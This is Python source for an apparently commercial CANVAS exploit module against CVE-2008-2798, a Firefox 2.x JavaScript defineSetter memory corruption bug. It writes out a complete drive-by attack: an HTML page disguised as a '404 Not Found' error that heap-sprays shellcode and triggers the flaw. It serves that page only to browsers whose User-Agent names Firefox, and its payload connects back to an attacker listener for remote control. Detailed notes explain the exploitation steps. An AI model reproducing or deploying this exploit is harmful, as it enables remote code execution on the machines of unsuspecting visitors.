#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator, win32shell 

NAME="Firefox <= 2.0.0.14 Javascript defineSetter Memory Corruption"
DESCRIPTION="A flaw in the way Mozilla Firefox Javascript Engine handle the defineSetter method allows to simulate a JSObject from an arbitrary memory area"
DOCUMENTATION={}
DOCUMENTATION["VENDOR"]="Mozilla"
DOCUMENTATION["Repeatability"]="Infinite (client side - crash the browser)"
DOCUMENTATION["CVE Name"] = "CVE-2008-2798"
DOCUMENTATION["CVS URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2798"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Date public"] = "07/01/2008"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "98","ME","2000","XP","2003" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:firefox_definesetter -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""
Change address to use 0x05050505 (instead of 0x04040404) for reliability reasons.
Tested in 2.0.0.12 and 2.0.0.14

"""

DEBUGNOTES="""
References:
  http://www.mozilla.org/security/announce/2008/mfsa2008-21.html
  https://bugzilla.mozilla.org/show_bug.cgi?id=371292

How it works:
the value in defineSetter * 2 + 1 + 8 is used to read a PTR.
So, in order to work, this value should be divisible by 2 (and the final PTR would be odd).
At 001B18D9 (D8C68 * 2 + 1 + 8) is mapped (statically) the unicode.nls file, which has a 0x05000000 DWORD there.
Our initial pointer is restricted by the size of the string variable used, ex:
var a = repeat(0x111111,unescape("%u0505"));
a.__defineSetter__(OFFSET, function(){});

OFFSET should be <= 0x111111 * 2


This DWORD (05000000) needs to satisfy these conditions also:
601204EE   A8 07            TEST AL,7
601204F0   75 2C            JNZ SHORT js3250.6012051E  ;we must NOT follow this
601204F2   83E0 F8          AND EAX,FFFFFFF8
601204F5   75 0D            JNZ SHORT js3250.60120504  ;we must follow this one

At 0x05000000 we filled our memory with 05050505.... which in turn will be used as a pointer again.

That 0x04000000 pointer is used here:
60120504  |> 8B08           MOV ECX,DWORD PTR DS:[EAX] ; EAX = 0x05000000, [EAX] = 0x05050505
60120506  |. 8D55 0C        LEA EDX,DWORD PTR SS:[EBP+C]
60120509  |. 52             PUSH EDX
6012050A  |. 6A 03          PUSH 3
6012050C  |. 8B49 04        MOV ECX,DWORD PTR DS:[ECX+4] ; ECX = 0x05050505, [ECX+4] = 0x05050505
6012050F  |. 50             PUSH EAX
60120510  |. 56             PUSH ESI
60120511  |. FF51 24        CALL DWORD PTR DS:[ECX+24] ; ECX = 0x05050505, [ECX+24] = 0x05050505

The 0505050505 value also means ADD EAX, 05050505. We used this value as a NOP instruction.

"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.AcceptAll

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="definesetter.html"
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, (addr * 2 + 1 + 8) -> 0x05000000 (must be a value >= 0x04000000 and ~ < 0x0c000000)
        self.versions[1]=("Windows XP SP2", 0xD8C68) # 0xD969B -> 0x04000000

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        from shellcode import shellcodeGenerator
        httpWrapper = ""
        try:
            if self.HTTPMOSDEF == True:
                self.log("[!] using HTTP MOSDEF tunneling payload ..")
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval": 0x1000 })
                sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                
                # this is what you need your exploits to port them to HTTPS MOSDEF compatibility
                if self.useSSLMOSDEF == True:
                    ssl = "s"
                else:
                    ssl = ""
                # end of change
                
                sc.addAttr("httpGetShellcode", {"URL": "http%s://%s:%d"%(ssl, self.callback.ip, self.callback.port)})
                httpWrapper = sc.get()
                self.log("[!] HTTP MOSDEF len: %d bytes"% len(httpWrapper))
        except Exception,msg:
            #print "Exception in HTTP MOSDEF Payload generation: %s" % msg
            httpWrapper = ""

        self.shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port, injectme=httpWrapper)
        
        return self.shellcode
   
    def run(self):
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
    
    def makefile(self):
        """Makes the actual bad html file"""
        if not self.createShellcode():
            return None
        
        html="""
<head>
<title>404 Not Found</title>
<style>
body {color: white};
</style>
</head><body leftmargin=0 topmargin=0 scroll=no>
<h1 style="color: black">Not Found</h1>
<span style="color: black">The requested URL / was not found on this server.</span><p>
<hr>
<body>
<script>
function repeat(count,what) {
   var v = "";
   while (--count >= 0) v += what;
   return v;
}
function spray(shellcode) {
var sc = unescape(shellcode);
blah = repeat(128, unescape("%u0505%u0505%u0505%u0505%u0505")) + sc;
bigblock = unescape("%u0505%u0505");
headersize = 20;
wap = headersize+blah.length
while (bigblock.length<wap) bigblock+=bigblock;
fillblock = bigblock.substring(0, wap);
block = bigblock.substring(0, bigblock.length-wap);
while(block.length+wap<0x40000) block = block+block+fillblock;
mm = new Array();
for (i=0;i<200;i++) mm[i] = block + blah;
}
//add an inofensive NOP before to prevent a casual opcode ...0590 -> ADD EAX,90050505 which could break everything
spray("%u9090%u9090%u9090SHELLCODE");
var a = repeat(0x111111,unescape("%u0505"));
a.__defineSetter__(0xOFFSET, function(){});
</script>
</body>
</html>""".replace("SHELLCODE",urluencode(self.shellcode)).replace("OFFSET","%x"%self.versions[self.version][1])

        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("Firefox")==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non Firefox browser connected - returning None")
            return None,None
        
        #send the exploit
        sploitstring = self.makefile()
        self.log("Sending %d bytes"%len(sploitstring))
        h.addHeader("Content-type","text/html")
        h.addHeader("Connection","close")
        b.setBody(sploitstring)
                    
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
